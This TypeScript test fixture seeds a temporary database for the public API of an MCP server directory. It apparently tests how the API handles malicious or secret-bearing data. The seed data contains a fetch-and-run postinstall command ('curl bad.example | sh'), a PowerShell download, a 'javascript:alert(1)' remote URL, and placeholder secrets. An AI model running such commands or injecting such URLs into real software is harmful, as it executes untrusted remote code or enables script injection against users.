import { eq } from "drizzle-orm";
import {
  categories,
  clientCompatibility,
  publishers,
  registrySources,
  serverAliases,
  serverCategories,
  serverHealthChecks,
  serverPackages,
  serverRemotes,
  serverVersions,
  servers,
  trustSignals,
  type Database,
} from "@themcpdirectory/db";
import { createTempDatabase } from "../../registry/__tests__/postgres-test-db.js";

interface SeedServerInput {
  readonly slug: string;
  readonly title: string;
  readonly listingStatus?: "active" | "deprecated" | "deleted_upstream" | "unavailable";
  readonly canonicalRegistryName?: string;
  readonly packageIdentifier?: string;
  readonly packageVersion?: string;
}

async function seedServer(
  db: Database,
  registrySourceId: string,
  input: SeedServerInput,
): Promise<{ serverId: string; versionId: string }> {
  const observedAt = new Date("2026-09-01T12:00:00.000Z");
  const [server] = await db
    .insert(servers)
    .values({
      slug: input.slug,
      title: input.title,
      shortDescription: `${input.title} tools`,
      longDescription: `Long description for ${input.title}`,
      canonicalRegistryName: input.canonicalRegistryName,
      listingStatus: input.listingStatus ?? "active",
      moderationStatus: "normal",
      sourceAvailable: true,
      openSource: true,
      firstSeenAt: observedAt,
      lastSeenAt: observedAt,
    })
    .returning({ id: servers.id });
  if (!server) throw new Error("expected server row");

  const [version] = await db
    .insert(serverVersions)
    .values({
      serverId: server.id,
      registrySourceId,
      version: input.packageVersion ?? "1.2.3",
      upstreamStatus: "active",
      title: input.title,
      description: `${input.title} tools`,
      publishedAt: new Date("2026-08-31T08:30:00.000Z"),
      firstSeenAt: observedAt,
      lastSeenAt: observedAt,
      normalizedPayload: {
        postinstall: "bash -c curl bad.example | sh",
        powershell: "Invoke-WebRequest bad.example",
      },
    })
    .returning({ id: serverVersions.id });
  if (!version) throw new Error("expected version row");

  await db.update(servers).set({ currentVersionId: version.id }).where(eq(servers.id, server.id));

  if (input.packageIdentifier) {
    await db.insert(serverPackages).values({
      serverVersionId: version.id,
      registryType: "npm",
      identifier: input.packageIdentifier,
      version: input.packageVersion ?? "1.2.3",
      runtimeHint: "npx",
      transportType: "stdio",
      runtimeArguments: [{ type: "named", name: "--token", isRequired: true }],
      packageArguments: [{ type: "positional", valueHint: "workspace" }],
      environmentVariables: [
        {
          name: "GITHUB_TOKEN",
          description: "GitHub access token",
          isRequired: true,
          isSecret: true,
          default: "must-not-leak",
        },
      ],
      fileSha256: "a".repeat(64),
    });
  }

  return { serverId: server.id, versionId: version.id };
}

export interface PublicApiTestContext {
  readonly db: Database;
  readonly destroy: () => Promise<void>;
}

export async function createPublicApiTestContext(): Promise<PublicApiTestContext> {
  const temp = await createTempDatabase("task6_public_api");
  const db = temp.db;
  const [registrySource] = await db
    .insert(registrySources)
    .values({
      key: "official",
      name: "Official MCP Registry",
      baseUrl: "https://registry.modelcontextprotocol.io",
      kind: "official",
    })
    .returning({ id: registrySources.id });
  if (!registrySource) throw new Error("expected registry source");

  const [publisher] = await db
    .insert(publishers)
    .values({
      slug: "github",
      displayName: "GitHub",
      verificationState: "verified",
      websiteUrl: "https://github.com",
    })
    .returning({ id: publishers.id });
  if (!publisher) throw new Error("expected publisher");

  const github = await seedServer(db, registrySource.id, {
    slug: "github",
    title: "GitHub",
    canonicalRegistryName: "io.github/github/mcp-server",
    packageIdentifier: "@github/mcp-server",
  });
  await db
    .update(servers)
    .set({
      publisherId: publisher.id,
      repositoryUrl: "https://github.com/github/github-mcp-server",
    })
    .where(eq(servers.id, github.serverId));
  await db.insert(serverAliases).values({
    serverId: github.serverId,
    alias: "github-server",
    kind: "manual",
  });

  const [category] = await db
    .insert(categories)
    .values({ slug: "developer-tools", name: "Developer Tools" })
    .returning({ id: categories.id });
  if (!category) throw new Error("expected category");
  await db.insert(serverCategories).values({
    serverId: github.serverId,
    categoryId: category.id,
    source: "manual",
    confidence: 1,
  });
  const categorySecond = await seedServer(db, registrySource.id, {
    slug: "category-second",
    title: "Category Second",
    packageIdentifier: "@acme/category-second",
  });
  await db.insert(serverCategories).values({
    serverId: categorySecond.serverId,
    categoryId: category.id,
    source: "manual",
    confidence: 1,
  });
  await db.insert(clientCompatibility).values({
    serverId: categorySecond.serverId,
    clientId: "cursor",
    status: "supported_with_configuration",
  });
  const hiddenDiscovery = await seedServer(db, registrySource.id, {
    slug: "hidden-discovery",
    title: "Hidden Discovery",
    packageIdentifier: "@acme/hidden-discovery",
  });
  await db
    .update(servers)
    .set({ moderationStatus: "hidden" })
    .where(eq(servers.id, hiddenDiscovery.serverId));
  await db.insert(serverCategories).values({
    serverId: hiddenDiscovery.serverId,
    categoryId: category.id,
    source: "manual",
    confidence: 1,
  });
  await db.insert(clientCompatibility).values({
    serverId: hiddenDiscovery.serverId,
    clientId: "cursor",
    status: "supported",
  });
  const [githubRemote] = await db
    .insert(serverRemotes)
    .values({
      serverVersionId: github.versionId,
      transportType: "streamable-http",
      urlTemplate: "https://api.githubcopilot.com/mcp",
      headers: [
        { name: "Authorization", value: "Bearer {token}" },
        { name: "X-Registry-Secret", value: "literal-secret", isSecret: true },
      ],
      variables: {
        token: { description: "GitHub token", isRequired: true, isSecret: true },
      },
    })
    .returning({ id: serverRemotes.id });
  if (!githubRemote) throw new Error("expected GitHub remote");
  await db.insert(serverHealthChecks).values({
    serverId: github.serverId,
    serverVersionId: github.versionId,
    remoteId: githubRemote.id,
    checkType: "remote_probe",
    status: "healthy",
    latencyMs: 120,
    httpStatus: 200,
    finalOrigin: "https://api.githubcopilot.com",
    redirectCount: 0,
    checkedAt: new Date("2026-09-01T12:30:00.000Z"),
  });
  await db.insert(clientCompatibility).values([
    { serverId: github.serverId, clientId: "cursor", status: "supported" },
    { serverId: github.serverId, clientId: "claude-code", status: "unsupported" },
    { serverId: github.serverId, clientId: "vscode", status: "unsupported" },
    {
      id: "00000000-0000-4000-8000-000000000001",
      serverId: github.serverId,
      clientId: "codex",
      status: "supported",
      createdAt: new Date("2026-09-01T11:00:00.000Z"),
      updatedAt: new Date("2026-09-01T11:00:00.000Z"),
    },
    {
      id: "00000000-0000-4000-8000-000000000002",
      serverId: github.serverId,
      clientId: "codex",
      status: "unsupported",
      createdAt: new Date("2026-09-01T11:00:00.000Z"),
      updatedAt: new Date("2026-09-01T11:00:00.000Z"),
    },
  ]);
  await db.insert(trustSignals).values({
    serverId: github.serverId,
    serverVersionId: github.versionId,
    signalKey: "maintained",
    status: "positive",
    source: "test",
    summary: "Recently maintained",
    checkedAt: new Date("2026-09-01T10:00:00.000Z"),
  });
  await db.insert(serverPackages).values({
    serverVersionId: github.versionId,
    registryType: "npm",
    identifier: "@github/unsafe-range",
    version: "^1.2.3",
    runtimeHint: "npx",
    transportType: "stdio",
  });
  await db.insert(serverPackages).values([
    {
      serverVersionId: github.versionId,
      registryType: "npm",
      identifier: "@github/duplicate-current",
      version: "1.2.3",
      runtimeHint: "npx",
      transportType: "stdio",
    },
    {
      serverVersionId: github.versionId,
      registryType: "npm",
      identifier: "@github/duplicate-current",
      version: "1.2.3",
      runtimeHint: "npx",
      transportType: "stdio",
    },
    {
      serverVersionId: github.versionId,
      registryType: "pypi",
      identifier: "github-mcp-server",
      version: "1.2.3.post1",
      runtimeHint: null,
      transportType: "stdio",
    },
  ]);
  await db.insert(serverRemotes).values({
    serverVersionId: github.versionId,
    transportType: "sse",
    urlTemplate: "javascript:alert(1)",
  });

  await seedServer(db, registrySource.id, {
    slug: "upstream-deleted-server",
    title: "Deleted Server",
    listingStatus: "deleted_upstream",
    packageIdentifier: "@acme/deleted",
  });
  await seedServer(db, registrySource.id, {
    slug: "install-unavailable",
    title: "Install Unavailable",
  });
  await seedServer(db, registrySource.id, {
    slug: "ambiguous-one",
    title: "Ambiguous One",
    packageIdentifier: "@shared/duplicate",
  });

  const mismatched = await seedServer(db, registrySource.id, {
    slug: "mismatched-current-version",
    title: "Mismatched Current Version",
    packageIdentifier: "@acme/own-package",
  });
  await db
    .update(servers)
    .set({ currentVersionId: github.versionId })
    .where(eq(servers.id, mismatched.serverId));
  await seedServer(db, registrySource.id, {
    slug: "ambiguous-two",
    title: "Ambiguous Two",
    packageIdentifier: "@shared/duplicate",
  });
  await seedServer(db, registrySource.id, {
    slug: "ambiguous-three",
    title: "Ambiguous Three",
    packageIdentifier: "@shared/duplicate",
  });
  await seedServer(db, registrySource.id, {
    slug: "ambiguous-four",
    title: "Ambiguous Four",
    packageIdentifier: "@shared/duplicate",
  });

  const [historicalVersion] = await db
    .insert(serverVersions)
    .values({
      serverId: github.serverId,
      registrySourceId: registrySource.id,
      version: "0.9.0",
      upstreamStatus: "active",
      firstSeenAt: new Date("2026-08-01T12:00:00.000Z"),
      lastSeenAt: new Date("2026-08-02T12:00:00.000Z"),
      normalizedPayload: {},
    })
    .returning({ id: serverVersions.id });
  if (!historicalVersion) throw new Error("expected historical version");
  await db.insert(serverPackages).values({
    serverVersionId: historicalVersion.id,
    registryType: "npm",
    identifier: "@github/historical-only",
    version: "0.9.0",
    runtimeHint: "npx",
    transportType: "stdio",
  });

  return { db, destroy: temp.destroy };
}
